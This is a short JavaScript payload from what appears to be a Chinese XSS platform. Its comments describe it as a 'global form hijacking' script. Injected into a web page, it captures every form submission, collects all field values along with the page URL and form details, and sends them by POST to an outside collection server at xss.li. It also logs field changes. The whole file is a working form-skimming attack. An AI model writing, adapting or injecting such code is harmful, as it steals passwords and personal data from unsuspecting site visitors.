// 表单劫持V2 - 全局监听版 - 黑客仓库XSS平台
// 监听页面所有表单提交，实时窃取表单数据

(function() {
    'use strict';
    
    const API = 'https://xss.li/api/collect.php';
    
    console.log('🎣 黑客仓库XSS - 全局表单劫持已激活');
    
    // 监听所有表单提交
    document.addEventListener('submit', async function(e) {
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        
        // 提取所有表单字段
        formData.forEach((value, key) => {
            data[key] = value;
        });
        
        // 构造payload
        const payload = {
            type: 'form_v2',
            formData: data,
            formAction: form.action,
            formMethod: form.method,
            formId: form.id || 'no-id',
            url: location.href,
            timestamp: new Date().toISOString()
        };
        
        console.log('📝 捕获表单提交:', form.action);
        
        // 发送到服务器
        try {
            await fetch(API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            console.log('✅ 表单数据已上传');
        } catch (error) {
            console.log('❌ 上传失败:', error);
        }
    }, true); // 使用捕获阶段
    
    // 还可以监听输入变化（实时记录）
    const inputs = document.querySelectorAll('input, textarea, select');
    inputs.forEach(input => {
        input.addEventListener('change', function() {
            console.log(`📋 字段变化: ${this.name} = ${this.value.substring(0, 20)}`);
        });
    });
    
})();
